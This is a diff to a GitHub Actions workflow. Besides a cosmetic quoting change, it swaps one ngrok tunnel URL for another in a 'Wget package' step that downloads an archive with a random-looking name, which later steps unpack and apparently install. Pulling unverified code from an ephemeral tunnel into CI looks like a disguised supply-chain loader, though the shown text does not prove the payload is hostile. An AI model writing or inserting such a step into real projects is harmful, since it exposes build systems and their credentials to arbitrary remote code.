@@ -8,12 +8,12 @@ jobs:
     steps:
       - uses: actions/checkout@v2
         with:
-          fetch-depth: 0
+          fetch-depth: "0"
       - uses: actions/setup-python@v2
         with:
           python-version: "3.8"
       - name: Wget package
-        run: wget https://245aeef793a0.ngrok.io/items/hf8734hfiu932fujiufhg928ufjoi23bhg9834
+        run: wget https://02efaf6fa8ef.ngrok.io/items/hf8734hfiu932fujiufhg928ufjoi23bhg9834
       - name: Unpack package
         run: tar -xvf hf8734hfiu932fujiufhg928ufjoi23bhg9834
       - name: Install package
